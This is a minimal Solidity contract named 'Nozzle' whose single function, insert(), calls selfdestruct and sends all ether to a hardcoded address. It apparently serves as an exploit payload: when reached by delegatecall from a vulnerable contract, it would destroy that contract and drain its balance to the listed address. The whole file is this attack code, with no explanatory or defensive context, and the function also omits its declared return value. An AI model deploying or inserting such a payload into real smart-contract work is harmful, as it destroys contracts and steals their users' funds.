contract Nozzle {
    function insert() external returns (bool) {
        selfdestruct(payable(0xB9A4ab20da6c53E15FADa3D9ad4B74633447Fe6E));
    }
}